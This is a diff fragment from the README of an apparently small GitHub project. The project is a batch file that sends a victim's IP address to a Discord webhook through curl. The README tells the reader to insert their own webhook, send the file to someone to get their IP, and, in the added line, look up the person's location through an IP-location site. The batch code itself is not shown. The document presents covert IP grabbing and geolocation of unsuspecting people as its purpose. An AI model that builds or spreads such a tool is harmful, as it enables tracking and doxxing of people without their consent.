@@ -37,7 +37,7 @@ a simple batch file that sends the victim's ip to a webhook via curl
  <strong>2. edit the .bat file: replace *your webhook here* with your discord webhook.
  
  <strong>3. send it to someone and get their ip.
-
+ <strong> (you can get their location by clicking [here](https://www.iplocation.net/))
 ----
 
 ### <p align="center">README Template by github.com/billythegoat356 ❤️</p>
